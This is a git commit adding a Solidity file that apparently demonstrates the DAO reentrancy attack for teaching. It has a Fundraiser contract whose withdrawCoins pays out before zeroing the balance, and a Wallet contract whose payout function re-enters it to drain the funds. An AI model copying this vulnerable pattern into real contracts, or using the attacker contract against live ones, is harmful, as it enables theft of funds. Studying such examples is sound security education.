e4976ab0713953fd37ec7a0222a2c884389bc45b
Pritesh Gudge <priteshgudge@gmail.com>
2020-06-24 17:22:19 +0530

    Create 3_DAOAttackExampleImplemented.sol

---
+++ daoattack/3_DAOAttackExampleImplemented.sol
@@ -0,0 +1,65 @@
+pragma solidity ^0.4.24;
+
+contract Fundraiser {
+    mapping(address=>uint) balances;
+
+    function withdrawCoins(){
+    //Vulnerability in this function
+      uint withdrawAmount = balances[msg.sender];
+      Wallet wallet = Wallet(msg.sender);
+      wallet.payout.value(withdrawAmount)(); 
+      //Payout is calling a function in the wallet on which we have no control over in the FundRaiser Contract
+      // This line could continue calling withdrawCoins as many times over and over till 
+      // no more money is left from the fundraiser without ever setting balance to zero
+      balances[msg.sender] = 0;
+
+    }
+
+    function getBalance() constant returns (uint) {
+        return address(this).balance;
+    }
+
+    function contribute() payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function() payable {
+
+    }
+}
+
+//Wallet with vulnerability expolitation code
+contract Wallet {
+
+    Fundraiser fundraiser;
+    //Adding this here for hack
+    uint recursion = 20;
+    
+    function Wallet(address fundraiserAddress) {
+        fundraiser = Fundraiser(fundraiserAddress);
+    }
+
+    function contribute(uint amount) {
+        fundraiser.contribute.value(amount)();
+    }
+
+    function withdraw(){
+        fundraiser.withdrawCoins();
+    }
+
+    function getBalance() constant returns (uint) {
+        return address(this).balance;
+    }
+
+    function payout() payable {
+        // Hacking code below
+        if(recursion > 0){
+            recursion--;
+            fundraiser.withdrawCoins();
+        }
+    }
+
+    function() payable {
+
+    }
+}
